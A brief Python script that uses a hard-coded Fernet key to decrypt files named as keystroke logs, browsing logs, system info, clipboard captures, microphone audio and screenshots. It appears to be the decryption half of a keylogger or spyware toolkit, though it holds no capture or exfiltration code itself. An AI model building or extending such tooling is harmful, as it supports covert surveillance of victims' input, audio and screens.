from cryptography.fernet import Fernet
import os

# Encryption key
key = b'qwt4aN_USq3wtdQS2Va-tMwNnxEAgsLSUWVN1ttKK80='  # Replace with your encryption key

# Define the encrypted files and their corresponding decrypted file names
encrypted_files = [
    'keystroke_e.log',
    'website_e.log',
    'sysinfo_e.txt',
    'clipboard_e.txt',
    'microphone_e.wav',
    'screenshot_e.png',
    'logs_e.zip'
]
decrypted_file_names = [
    'f_keystroke.txt',
    'f_website.log',
    'f_sysinfo.txt',
    'f_clipboard.txt',
    'f_microphone.wav',
    'f_screenshot.png',
    'f_logs.zip'
]

# Decrypt each file using the encryption key
for encrypted_file, decrypted_file_name in zip(encrypted_files, decrypted_file_names):
    with open(encrypted_file, 'rb') as file:
        data = file.read()

    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(data)

    with open(decrypted_file_name, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)